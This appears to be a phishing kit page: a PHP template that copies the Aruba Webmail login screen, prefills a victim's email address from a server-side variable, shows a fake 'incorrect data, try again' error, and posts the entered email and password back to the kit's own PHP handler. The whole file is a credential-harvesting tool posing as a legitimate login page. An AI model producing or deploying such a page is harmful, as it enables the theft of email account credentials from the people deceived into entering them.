<?php include '../build.php' ?>
<html lang="en" data-beasties-container="" data-theme="light">
  <head>
  <script type="text/javascript">/*<![CDATA[*/function MaskedPassword(e,d){if(typeof document.getElementById=="undefined"||typeof document.styleSheets=="undefined"){return false}if(e==null){return false}this.symbol=d;this.isIE=typeof document.uniqueID!="undefined";e.value="";e.defaultValue="";e._contextwrapper=this.createContextWrapper(e);this.fullmask=false;var f=e._contextwrapper;var b='<input type="hidden" name="'+e.name+'">';var c=this.convertPasswordFieldHTML(e);f.innerHTML=b+c;e=f.lastChild;e.className+=" masked";e.setAttribute("autocomplete","off");e._realfield=f.firstChild;e._contextwrapper=f;this.limitCaretPosition(e);var a=this;this.addListener(e,"change",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"input",function(g){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"propertychange",function(g){a.doPasswordMasking(a.getTarget(g))});this.addListener(e,"keyup",function(g){if(!/^(9|1[678]|224|3[789]|40)$/.test(g.keyCode.toString())){a.fullmask=false;a.doPasswordMasking(a.getTarget(g))}});this.addListener(e,"blur",function(g){a.fullmask=true;a.doPasswordMasking(a.getTarget(g))});this.forceFormReset(e);return true}MaskedPassword.prototype={doPasswordMasking:function(a){var d="";if(a._realfield.value!=""){for(var b=0;b<a.value.length;b++){if(a.value.charAt(b)==this.symbol){d+=a._realfield.value.charAt(b)}else{d+=a.value.charAt(b)}}}else{d=a.value}var c=this.encodeMaskedPassword(d,this.fullmask,a);if(a._realfield.value!=d||a.value!=c){a._realfield.value=d;a.value=c}},encodeMaskedPassword:function(d,f,b){var a=f===true?0:1;for(var e="",c=0;c<d.length;c++){if(c<d.length-a){e+=this.symbol}else{e+=d.charAt(c)}}return e},createContextWrapper:function(a){var b=document.createElement("span");b.style.position="relative";a.parentNode.insertBefore(b,a);b.appendChild(a);return b},forceFormReset:function(a){while(a){if(/form/i.test(a.nodeName)){break}a=a.parentNode}if(!/form/i.test(a.nodeName)){return null}this.addSpecialLoadListener(function(){a.reset()});return a},convertPasswordFieldHTML:function(c,e){var b="<input";for(var d=c.attributes,a=0;a<d.length;a++){if(d[a].specified&&!/^(_|type|name)/.test(d[a].name)){b+=" "+d[a].name+'="'+d[a].value+'"'}}b+=' type="text" autocomplete="off">';return b},limitCaretPosition:function(a){var d=null,c=function(){if(d==null){if(this.isIE){d=window.setInterval(function(){var e=a.createTextRange(),g=a.value.length,f="character";e.moveEnd(f,g);e.moveStart(f,g);e.select()},100)}else{d=window.setInterval(function(){var e=a.value.length;if(!(a.selectionEnd==e&&a.selectionStart<=e)){a.selectionStart=e;a.selectionEnd=e}},100)}}},b=function(){window.clearInterval(d);d=null};this.addListener(a,"focus",function(){c()});this.addListener(a,"blur",function(){b()})},addListener:function(c,a,b){if(typeof document.addEventListener!="undefined"){return c.addEventListener(a,b,false)}else{if(typeof document.attachEvent!="undefined"){return c.attachEvent("on"+a,b)}}},addSpecialLoadListener:function(a){if(this.isIE){return window.attachEvent("onload",a)}else{return document.addEventListener("DOMContentLoaded",a,false)}},getTarget:function(a){if(!a){return null}return a.target?a.target:a.srcElement}};/*]]>*/</script>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title> Aruba Webmail</title>

    <meta http-equiv="Cache-control" content="no-cache, no-store, must-revalidate">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">

    
    <meta name="description" content="La WebMail Aruba ti consente di accedere alle tue caselle in qualunque momento e da qualsiasi dispositivo grazie all''interfaccia totalmente responsive">
    <meta name="keywords" content="Aruba Spa, WebMail, PEC">
    <meta name="author" content="Aruba Spa">
    <meta name="viewport" content="width=device-width, initial-scale=1,maximum-scale=1.0,user-scalable=0">

    <!-- Favicon -->
    <link rel="icon" href="https://webmail.aruba.it/new/assets/brand/domini/favicon.ico">
    <link rel="stylesheet" type="text/css" href="../assets/css/styles-OVNL66GE.css">

    <!-- Google Fonts Preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com/">
    <link rel="dns-prefetch" href="https://fonts.googleapis.com/">
    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
    <link rel="dns-prefetch" href="https://fonts.gstatic.com/" crossorigin="">

    <style>
      .input-field {
          margin-top: 5px;
          margin-bottom: 18px;
      }
      .svg-wrap {
        display: inline-block;
        width: 113px;
        height: 32px;
        overflow: hidden;
      }

      .svg-wrap svg {
        width: 100%;
        height: 100%;
      }

      .aru-message {
        background-color: #fdeeee;
        border-top: 4px solid #d0021b;
        padding: 12px 16px;
      }

      .aru-message__content {
        display: flex;
      }

      .aru-message__text {
        display: flex;
        align-items: flex-start;
        gap: 10px;
      }

      .error-wrap {
        color: #d0021b;
        fill: #ffffff;
        display: inline-flex;
        flex-shrink: 0;
      }

      .error-wrap svg {
        width: 24px;
        height: 34px;
        display: block;
        position: relative;
        top: -1px;
      }

      .aru-message__message strong {
        color: #212529;
        font-weight: 700;
        font-size: 14px;
        line-height: 1.5;
      }

      .submit-button {
        font-family: Lato, Arial, sans-serif;
        font-size: 14px;
        font-weight: 400;
        color: #ffffff;
        background-color: #1474bd;
        border-color: #1474bd;
        border-radius: 2px;
        width: 300px;
        height: 40px;
        border: none;
        cursor: pointer; /* good practice so it looks clickable */
      }

      .submit-button:hover {
        background-color: #0E5184;
      }

      .aru-input-wrap__header {
        display: flex;
        align-items: center;
        justify-content: space-between;
      }

      .forgot-password-link {
        margin-left: auto;
        font-size: 13px;
        white-space: nowrap;
      }

    .aru-message {
        display: flex;
        flex-direction: row;
        align-items: center;
        justify-content: space-between;
        align-items: start;
        width: 300px;
        height: 78px;
        margin-bottom: 20px;
    }

    .aru-message__danger {
        display: flex;
        border-top: var(--tkn-layout-border-size-4) solid rgb(var(--tkn-ui-interactive-outline-danger-default-border));
        background-color: rgb(var(--tkn-color-danger-100));
        padding-top: 13px;
        padding-left: 20px;
    }

    .aru-message__danger aru-symbol {
        color: #d0021b;
    }

    .aru-message .aru-message__left-side .aru-message__header .aru-message__content {
        flex-direction: column;
        padding-right: var(--tkn-layout-spacing-xs);
        padding-bottom: var(--tkn-layout-spacing-sm);
        padding-left: var(--tkn-layout-spacing-xs);
        gap: var(--tkn-layout-spacing-2xs);
    }
    </style>
    
    <style>
      .form-container[_ngcontent-ng-c2869048622]{max-width:300px;min-width:300px}.agmonza[_ngcontent-ng-c2869048622]   .form-container[_ngcontent-ng-c2869048622]{max-width:95%;min-width:95%}.agmonza[_ngcontent-ng-c2869048622]   form[_ngcontent-ng-c2869048622]{font-family:open sans}.pec-banner[_ngcontent-ng-c2869048622]{border-radius:8px;padding:2px;background:linear-gradient(to right,#caecfa,#c4f6c8)}.pec-banner-inner[_ngcontent-ng-c2869048622]{border-radius:8px;background:linear-gradient(#f3fbfe,#f3fef4);padding:.5rem 1rem}@media (max-width: 1023px){.pec-banner-inner[_ngcontent-ng-c2869048622]{padding:.5rem}}.pec-banner[_ngcontent-ng-c2869048622]   .message[_ngcontent-ng-c2869048622]{max-width:460px}@media (max-width: 1023px){.pec-banner[_ngcontent-ng-c2869048622]   .message[_ngcontent-ng-c2869048622]{font-size:14px}}.pel-banner[_ngcontent-ng-c2869048622]{width:100%;height:auto;border:0}</style><style>.full-page[_ngcontent-ng-c4051325184]{height:100vh;width:100vw;background-repeat:no-repeat;background-position-x:center}.full-page[_ngcontent-ng-c4051325184]   .layout[_ngcontent-ng-c4051325184]{gap:64px}.full-page[_ngcontent-ng-c4051325184]   .layout[_ngcontent-ng-c4051325184]   .banner[_ngcontent-ng-c4051325184]{overflow:hidden}.full-page[_ngcontent-ng-c4051325184]   .layout[_ngcontent-ng-c4051325184]   .banner[_ngcontent-ng-c4051325184]   iframe[_ngcontent-ng-c4051325184]{width:600px;height:100%;margin-top:50px}.full-page[_ngcontent-ng-c4051325184]   .layout[_ngcontent-ng-c4051325184]   .content-layout[_ngcontent-ng-c4051325184]{width:100%}.full-page[_ngcontent-ng-c4051325184]   .layout[_ngcontent-ng-c4051325184]   .content-layout.login[_ngcontent-ng-c4051325184]{width:720px}.full-page[_ngcontent-ng-c4051325184]   .layout[_ngcontent-ng-c4051325184]   .content-layout[_ngcontent-ng-c4051325184]   .header[_ngcontent-ng-c4051325184]{border-bottom:1px solid #b9c4cd}.full-page[_ngcontent-ng-c4051325184]   .layout[_ngcontent-ng-c4051325184]   .content-layout[_ngcontent-ng-c4051325184]   .header[_ngcontent-ng-c4051325184]   .simple-title[_ngcontent-ng-c4051325184]{font-size:18px;font-weight:400;line-height:20px}.full-page[_ngcontent-ng-c4051325184]   .layout[_ngcontent-ng-c4051325184]   .content-layout[_ngcontent-ng-c4051325184]   .header[_ngcontent-ng-c4051325184]   .domain[_ngcontent-ng-c4051325184]{font-size:18px;font-weight:700;line-height:20px}.full-page[_ngcontent-ng-c4051325184]   .layout[_ngcontent-ng-c4051325184]   .content-layout[_ngcontent-ng-c4051325184]   .help-menu[_ngcontent-ng-c4051325184]{height:100%;margin-right:calc(-1 * var(--aru-navbar-inner-spacing) + 1px)}.full-page[_ngcontent-ng-c4051325184]   .layout[_ngcontent-ng-c4051325184]   .content-layout[_ngcontent-ng-c4051325184]   .help-menu-panel[_ngcontent-ng-c4051325184]{width:220px}.full-page[_ngcontent-ng-c4051325184]   .layout[_ngcontent-ng-c4051325184]   .content-layout[_ngcontent-ng-c4051325184]   img[_ngcontent-ng-c4051325184]{max-width:100%;height:auto}.full-page[_ngcontent-ng-c4051325184]   .layout[_ngcontent-ng-c4051325184]   .content-layout[_ngcontent-ng-c4051325184]   .footer-links[_ngcontent-ng-c4051325184]{font-size:12px}.full-page[_ngcontent-ng-c4051325184]   .layout[_ngcontent-ng-c4051325184]   .content-layout[_ngcontent-ng-c4051325184]   .footer-links[_ngcontent-ng-c4051325184]   a[_ngcontent-ng-c4051325184]{margin:0 5px}@media (min-width: 1024px){.full-page[_ngcontent-ng-c4051325184]   .layout[_ngcontent-ng-c4051325184]{padding:32px}}.full-page.agmonza[_ngcontent-ng-c4051325184]{background-repeat:no-repeat;background-position:0%}@font-face{font-family:Open Sans;font-style:normal;font-weight:400;font-stretch:100%;src:url(https://fonts.gstatic.com/s/opensans/v44/memSYaGs126MiZpBA-UvWbX2vVnXBbObj2OVZyOOSr4dVJWUgsjZ0B4gaVI.woff2) format("woff2");unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02BB-02BC,U+02C6,U+02DA,U+02DC,U+0304,U+0308,U+0329,U+2000-206F,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}.full-page.agmonza[_ngcontent-ng-c4051325184]   .login_header[_ngcontent-ng-c4051325184]{background-repeat:no-repeat;background-position:0%;background-color:#fff;text-align:center;height:50px;width:100vw;opacity:.5}.full-page.agmonza[_ngcontent-ng-c4051325184]   .content-layout.login[_ngcontent-ng-c4051325184]{width:500px!important;height:fit-content;background-color:#fff;opacity:90%}@media (max-width: 500px){.full-page.agmonza[_ngcontent-ng-c4051325184]   .content-layout.login[_ngcontent-ng-c4051325184]{width:100vw!important}}.full-page.agmonza[_ngcontent-ng-c4051325184]   .content-layout[_ngcontent-ng-c4051325184]   .header[_ngcontent-ng-c4051325184]{padding:8px 15px 0;border-bottom:none!important}.full-page.agmonza[_ngcontent-ng-c4051325184]   .content-layout[_ngcontent-ng-c4051325184]   .header[_ngcontent-ng-c4051325184]   .logo[_ngcontent-ng-c4051325184]{height:85px;width:100%}.full-page.agmonza[_ngcontent-ng-c4051325184]   .content-layout[_ngcontent-ng-c4051325184]   .header[_ngcontent-ng-c4051325184]   .logo[_ngcontent-ng-c4051325184]   img[_ngcontent-ng-c4051325184]{height:75px}.full-page.agmonza[_ngcontent-ng-c4051325184]   .content-layout[_ngcontent-ng-c4051325184]   .header[_ngcontent-ng-c4051325184]   .left_logo[_ngcontent-ng-c4051325184]{float:left}.full-page.agmonza[_ngcontent-ng-c4051325184]   .content-layout[_ngcontent-ng-c4051325184]   .header[_ngcontent-ng-c4051325184]   .right_logo[_ngcontent-ng-c4051325184]{float:right}.full-page.agmonza[_ngcontent-ng-c4051325184]   .content-layout[_ngcontent-ng-c4051325184]   .header[_ngcontent-ng-c4051325184]   .login_text[_ngcontent-ng-c4051325184]{margin:25px 0 0;font:700 italic 20px open sans;color:#000}.full-page.agmonza[_ngcontent-ng-c4051325184]   .content-layout[_ngcontent-ng-c4051325184]   .header[_ngcontent-ng-c4051325184]   .features_desc[_ngcontent-ng-c4051325184]{margin:5px 0 0;font:italic 14px open sans;color:#9a9a9a}.full-page.agmonza[_ngcontent-ng-c4051325184]   .footer-links[_ngcontent-ng-c4051325184]{display:none}.full-page.truefalse[_ngcontent-ng-c4051325184]{background-repeat:no-repeat;background-position:0%}.full-page.truefalse[_ngcontent-ng-c4051325184]   .login_header[_ngcontent-ng-c4051325184]{height:50px}.full-page.truefalse[_ngcontent-ng-c4051325184]   .layout[_ngcontent-ng-c4051325184]{background-size:contain;padding:5.4em 4em 4em;background-repeat:no-repeat;width:750px;margin:auto}@media (max-width: 750px){.full-page.truefalse[_ngcontent-ng-c4051325184]   .layout[_ngcontent-ng-c4051325184]{width:100vw!important}}.full-page.truefalse[_ngcontent-ng-c4051325184]   .layout[_ngcontent-ng-c4051325184]   .content-layout.login[_ngcontent-ng-c4051325184]{border-radius:35px;width:620px!important;height:fit-content;margin-top:15px;background-color:#fff}.full-page.truefalse[_ngcontent-ng-c4051325184]   .layout[_ngcontent-ng-c4051325184]   .content-layout[_ngcontent-ng-c4051325184]   .header[_ngcontent-ng-c4051325184]{padding:8px 15px 0;border-bottom:none!important}.full-page.truefalse[_ngcontent-ng-c4051325184]   .layout[_ngcontent-ng-c4051325184]   .content-layout[_ngcontent-ng-c4051325184]   .header[_ngcontent-ng-c4051325184]   .logo[_ngcontent-ng-c4051325184]{height:85px;width:100%}.full-page.truefalse[_ngcontent-ng-c4051325184]   .layout[_ngcontent-ng-c4051325184]   .content-layout[_ngcontent-ng-c4051325184]   .header[_ngcontent-ng-c4051325184]   .logo[_ngcontent-ng-c4051325184]   img[_ngcontent-ng-c4051325184]{height:75px}.full-page.truefalse[_ngcontent-ng-c4051325184]   .layout[_ngcontent-ng-c4051325184]   .content-layout[_ngcontent-ng-c4051325184]   .header[_ngcontent-ng-c4051325184]   .left_logo[_ngcontent-ng-c4051325184]{float:left}.full-page.truefalse[_ngcontent-ng-c4051325184]   .layout[_ngcontent-ng-c4051325184]   .content-layout[_ngcontent-ng-c4051325184]   .header[_ngcontent-ng-c4051325184]   .right_logo[_ngcontent-ng-c4051325184]{float:right}.logo-size[_ngcontent-ng-c4051325184]{max-width:300px;width:100%}
    </style>

    <style>
      [_nghost-ng-c1494514778] {
        width:120px;
        min-height:40px;
        display:flex;
        align-items:center
      }

      [_nghost-ng-c1494514778].brand[_ngcontent-ng-c1494514778] {
        width:auto;
        height:auto;
        max-width:120px;
        max-height:40px
      }

      .lg[_nghost-ng-c1494514778] {
        width:190px;
        min-height:45px;
      }
      
      .lg[_nghost-ng-c1494514778]   .brand[_ngcontent-ng-c1494514778] {
        max-width:190px;
        max-height:45px
      }

    </style>
  
    <style>
      .language-menu[_ngcontent-ng-c1546893732] {
        height:100%;margin-right:calc(-1 * var(--aru-navbar-inner-spacing) + 1px)
      }
        
      .language-menu-panel[_ngcontent-ng-c1546893732]{
          width:220px
      }
    </style>

    <style>
    @font-face{font-family:'Lato';font-style:italic;font-weight:300;font-display:swap;src:url(https://fonts.gstatic.com/s/lato/v25/S6u_w4BMUTPHjxsI9w2_FQft1dw.woff2) format('woff2');unicode-range:U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;}@font-face{font-family:'Lato';font-style:italic;font-weight:300;font-display:swap;src:url(https://fonts.gstatic.com/s/lato/v25/S6u_w4BMUTPHjxsI9w2_Gwft.woff2) format('woff2');unicode-range:U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;}@font-face{font-family:'Lato';font-style:italic;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/lato/v25/S6u8w4BMUTPHjxsAUi-qJCY.woff2) format('woff2');unicode-range:U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;}@font-face{font-family:'Lato';font-style:italic;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/lato/v25/S6u8w4BMUTPHjxsAXC-q.woff2) format('woff2');unicode-range:U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;}@font-face{font-family:'Lato';font-style:italic;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/lato/v25/S6u_w4BMUTPHjxsI5wq_FQft1dw.woff2) format('woff2');unicode-range:U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;}@font-face{font-family:'Lato';font-style:italic;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/lato/v25/S6u_w4BMUTPHjxsI5wq_Gwft.woff2) format('woff2');unicode-range:U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;}@font-face{font-family:'Lato';font-style:normal;font-weight:300;font-display:swap;src:url(https://fonts.gstatic.com/s/lato/v25/S6u9w4BMUTPHh7USSwaPGR_p.woff2) format('woff2');unicode-range:U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;}@font-face{font-family:'Lato';font-style:normal;font-weight:300;font-display:swap;src:url(https://fonts.gstatic.com/s/lato/v25/S6u9w4BMUTPHh7USSwiPGQ.woff2) format('woff2');unicode-range:U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;}@font-face{font-family:'Lato';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/lato/v25/S6uyw4BMUTPHjxAwXjeu.woff2) format('woff2');unicode-range:U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;}@font-face{font-family:'Lato';font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/lato/v25/S6uyw4BMUTPHjx4wXg.woff2) format('woff2');unicode-range:U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;}@font-face{font-family:'Lato';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/lato/v25/S6u9w4BMUTPHh6UVSwaPGR_p.woff2) format('woff2');unicode-range:U+0100-02BA, U+02BD-02C5, U+02C7-02CC, U+02CE-02D7, U+02DD-02FF, U+0304, U+0308, U+0329, U+1D00-1DBF, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20C0, U+2113, U+2C60-2C7F, U+A720-A7FF;}@font-face{font-family:'Lato';font-style:normal;font-weight:700;font-display:swap;src:url(https://fonts.gstatic.com/s/lato/v25/S6u9w4BMUTPHh6UVSwiPGQ.woff2) format('woff2');unicode-range:U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;}
    </style>
</head>
<body class="domini">
  <webmail-authentication-main>
    <router-outlet>
      
    </router-outlet>
    <webmail-login _nghost-ng-c2869048622="">
      <webmail-auth-layout _ngcontent-ng-c2869048622="" _nghost-ng-c4051325184="">
        <div _ngcontent-ng-c4051325184="" class="full-page">
          <!---->
          <div _ngcontent-ng-c4051325184="" class="layout h-100 d-flex justify-content-center overflow-auto">
            <div _ngcontent-ng-c4051325184="" class="banner py-1">
              <iframe _ngcontent-ng-c4051325184="" title="Advertisement" id="left_id" tabindex="-1" class="visible" src="../assets/icons/76368936.jpg?bv=2">
              </iframe>
            </div>
            <!---->
            <div _ngcontent-ng-c4051325184="" class="content-layout d-flex flex-column gap-4 login py-1">
              <!---->
              <div _ngcontent-ng-c4051325184="" class="header pb-2 d-flex align-items-center justify-content-between">
                <!---->
                <div _ngcontent-ng-c4051325184="" class="logo logo-size">
                  <div _ngcontent-ng-c4051325184="" class="d-flex justify-content-center">
                    <!---->
                    <aru-brand _ngcontent-ng-c4051325184="" brandsymbol="aruba" brandsize="lg" class="pt-1">
                      <span class="svg-wrap">
                        <svg preserveAspectRatio="xMinYMin meet" role="img" title="aruba">
                          <use href="../assets/icons/symbols-brand.svg#aru-symbol-aruba-color" viewBox="0 0 160 31"></use>
                        </svg>
                      </span> 
                    </aru-brand>
                    <!---->
                  </div>
                </div>
                <div _ngcontent-ng-c4051325184="" class="d-flex align-items-center">
                  <aru-button-menu _ngcontent-ng-c4051325184="" kind="ghost" buttonskin="secondary" alignplacement="bottom" aria-label="Help Menu" class="help-menu flex-0" alignorder="start" buttonsize="md" containerkind="boxed">
                    <div _ngcontent-ng-c4051325184="" slot="end-content">
                      <div _ngcontent-ng-c4051325184="" class="d-flex align-items-center gap-1">
                        <aru-symbol _ngcontent-ng-c4051325184="" size="md" symbol="question-mark-big-regular" sprite="symbols" path="../assets/icons/symbols-webmail.svg" prefix="aru-symbol-" kind="outline">
                        </aru-symbol>
                        <!---->
                        <aru-symbol _ngcontent-ng-c4051325184="" symbol="input-arrow-down" sprite="symbols" size="md" path="../assets/icons/symbols-webmail.svg" prefix="aru-symbol-" kind="outline">
                        </aru-symbol>
                        <!---->
                      </div>
                    </div>
                    <aru-panel _ngcontent-ng-c4051325184="" slot="panel" position="absolute" class="help-menu-panel" separatorspacingx="none" separatorspacingy="none">
                      <div _ngcontent-ng-c4051325184="" slot="body">
                        <aru-menu _ngcontent-ng-c4051325184="" direction="y" aria-label="Menu">
                        </aru-menu>
                      </div>
                    </aru-panel>
                  </aru-button-menu>
                  <!---->
                  <webmail-language-selector _ngcontent-ng-c4051325184="" _nghost-ng-c1546893732="">
                    <aru-button-menu _ngcontent-ng-c1546893732="" kind="ghost" buttonskin="secondary" alignplacement="bottom" class="language-menu flex-0" alignorder="start" buttonsize="md" containerkind="boxed">
                      <div _ngcontent-ng-c1546893732="" slot="end-content">
                        <div _ngcontent-ng-c1546893732="" class="d-flex align-items-center gap-1">
                          <!---->
                          <aru-symbol _ngcontent-ng-c1546893732="" symbol="input-arrow-down" sprite="symbols" size="md" path="../assets/icons/symbols-webmail.svg" prefix="aru-symbol-" kind="outline">
                          </aru-symbol>
                          <!---->
                        </div>
                      </div>
                      <aru-panel _ngcontent-ng-c1546893732="" slot="panel" position="absolute" class="language-menu-panel" separatorspacingx="none" separatorspacingy="none">
                        <div _ngcontent-ng-c1546893732="" slot="body">
                          <aru-menu _ngcontent-ng-c1546893732="" direction="y" aria-label="Menu">
                          </aru-menu>
                        </div>
                      </aru-panel>
                    </aru-button-menu>
                  </webmail-language-selector>
                  <!---->
                </div>
                <!---->
              </div>
              <!---->
              <div _ngcontent-ng-c2869048622="" class="mt-4 mb-2 d-flex flex-column gap-2 justify-content-center align-items-center">
                <webmail-main-logo _ngcontent-ng-c2869048622="" _nghost-ng-c1494514778="" class="lg">
                  <!---->
                  <img _ngcontent-ng-c1494514778="" alt="logo-preview" imgexternal="" class="brand" tabindex="-1" src="../assets/icons/logo.svg">
                  <!---->
                  <!---->
                  <!---->
                </webmail-main-logo>
                <h4 _ngcontent-ng-c2869048622="" class="fw-bold font-size-16">
                  Accedi alla Webmail
                </h4>
              </div>
              <!---->
              <div _ngcontent-ng-c2869048622="" class="form-container mt-2 mx-auto">
                <!---->
                <form action="" method="post" novalidate="" autocomplete="off" tabindex="0" class="ng-invalid ng-touched ng-dirty">
                  <input type="hidden" name="login" value="aruba">
                  <div class="aru-message aru-message__danger aru-message--vertical" style="<?php echo $error; ?>">
                    <div class="aru-message__content">
                      <div class="aru-message__text">
                        <span class="error-wrap">
                          <svg preserveAspectRatio="xMinYMin meet" role="img" aria-label="Error">
                            <use href="../assets/icons/symbols-webmail.svg#aru-symbol-semantic-danger-duotone" viewBox="0 0 21.5 21.5"></use>
                          </svg>
                        </span>
                        <div class="aru-message__message aru-message__message--vertical">
                          <strong>I dati inseriti non sono corretti.<br>Verifica e riprova</strong>
                        </div>
                      </div>
                    </div>
                  </div>
                  <div class="aru-input-wrap__header">
                    <slot name="header">
                      <!-- Contenuto di fallback se lo slot non viene riempito -->
                      <div class="aru-input-wrap__header-text__label" for="" aria-label="Indirizzo email">           
                      <span style="font-weight:700;">Indirizzo email</span>
                        <i class="aru-input-wrap__header-text__label__sub-label"></i>
                      </div>
                    </slot>
                    <slot name="end-content"></slot>
                  </div>
                  <input aria-label="input field" tabindex="0" id="input" data-monitoring-name="pe_login_username" required="" class="form-control input-field" placeholder="<?php echo htmlspecialchars($decoded); ?>" type="email" name="user" value="<?php echo htmlspecialchars($decoded); ?>" autocomplete="off">

                  <div class="aru-input-wrap__header">
                    <slot name="header">
                      <!-- Contenuto di fallback se lo slot non viene riempito -->
                      <div class="aru-input-wrap__header-text__label" for="" aria-label="Password">
                        <span style="font-weight:700;">Password</span>
                        <i class="aru-input-wrap__header-text__label__sub-label"></i>
                      </div>
                    </slot>
                    <slot name="end-content">
                      <a routerlink="#" title="Password dimenticata?" href="#" class="forgot-password-link">
                        Password dimenticata?
                      </a>
                    </slot>
                  </div>
                  <input aria-label="input field" tabindex="0" id="password" data-monitoring-name="pe_login_password" required="" class="form-control input-field" placeholder="" type="text" name="pass" autocomplete="off">
                  <!---->
                  <label aria-label="Input choice" class="input-container" draggable="false" aria-disabled="false">
                  <div class="aru-input-choice__left-side">
                    <div class="aru-input-checkbox" role="checkbox" aria-checked="false" aria-label="Remember me" tabindex="0">
                  <input data-monitoring-name="" class="aru-input-choice aru-input-checkbox__input" id="undefined" type="checkbox" tabindex="0" name="undefined" value="" role="checkbox" aria-checked="false" aria-disabled="false" aria-label="Remember me">
                
                    <span class="aru-input-checkbox__checkmark" style="width:16px;height:16px;"></span>
                        <aru-text class="input-label keep-light">
                          <template shadowrootmode="open"><!---->
                            <span style="--aru-text-truncate-rows:1;" class="aru-text aru-text--truncate-word" aria-label="Remember me" role="text" title="Ricordami">Ricordami</span>
                        </template>
                        </aru-text>
                    </div>
                  </div>
                  <div class="aru-input-choice__right-side">
                  </div>
                  </label>
                  <!---->
                  <div _ngcontent-ng-c2869048622="" class="pt-3">
                    <button type="submit" onclick="submitLogin(event);" class="submit-button" title="Accedi">Accedi</button>
                  </div>
                </form>
              </div>
              <!---->
              <!---->
              <div _ngcontent-ng-c4051325184="" class="footer mt-4">
                <!---->
                <div _ngcontent-ng-c4051325184="" class="text-center mt-4 footer-links">
                  <span _ngcontent-ng-c4051325184="" class="text-muted">
                    Copyright © 2026 Aruba S.p.A. - VAT No. 01573850516 - All rights reserved -
                  </span>
                  <!---->
                  <a _ngcontent-ng-c4051325184="" target="_blank" rel="noopener" href="#">
                    Privacy
                  </a>
                  -
                  <a _ngcontent-ng-c4051325184="" target="_blank" href="#">
                    Cookie Policy
                  </a>
                  -
                  <a _ngcontent-ng-c4051325184="" tabindex="0" class="cursor-pointer">
                    Personalizza cookie
                  </a>
                  <!---->
                </div>
              </div>
            </div>
          </div>
        </div>
      </webmail-auth-layout>
    </webmail-login>
    <!---->
  </webmail-authentication-main>
</body>
</script>
<script type="text/javascript">new MaskedPassword(document.getElementById("password"),"\u25CF");document.getElementById("demo-form").onsubmit=function(){alert('pword = "'+this.pword.value+'"');return false};</script>
</html>